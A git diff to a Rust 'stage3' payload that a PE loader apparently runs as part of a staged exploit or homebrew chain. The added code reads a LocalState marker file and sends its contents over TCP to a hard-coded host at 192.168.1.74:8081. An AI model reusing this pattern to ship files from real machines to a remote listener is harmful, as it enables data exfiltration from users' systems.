@@ -1,7 +1,7 @@
 #[cfg(feature = "debug")]
 use log::*;
 
-use std::io::Write;
+use std::{io::Write, path::PathBuf};
 
 fn main() {
     #[cfg(feature = "debug")]
@@ -23,9 +23,23 @@ fn main() {
     #[cfg(not(feature = "debug"))]
     {
         let app_data = std::env::var("LOCALAPPDATA").expect("failed to get %LOCALAPPDATA%");
-        let mut file =
-            std::fs::File::create(format!("{}\\..\\LocalState\\stage3_complete.txt", app_data))
-                .unwrap();
+
+        // let _ = std::fs::write(
+        //     format!("{}\\..\\LocalState\\args.txt", app_data),
+        //     b"arg1 arg2 arg3_testing_with!!!chars",
+        // );
+
+        let file_path = PathBuf::from(format!("{}\\..\\LocalState\\stage3_complete.txt", app_data));
+        #[cfg(feature = "network")]
+        {
+            if file_path.exists() {
+                let file_data = std::fs::read(&file_path).unwrap();
+                // Talk to the remote server
+                let mut socket = std::net::TcpStream::connect("192.168.1.74:8081").unwrap();
+                let _ = socket.write_all(&file_data);
+            }
+        }
+        let mut file = std::fs::File::create(&file_path).unwrap();
         writeln!(
             &mut file,
             "if you're reading this, stage3 successfully loaded and ran by the PE loader"
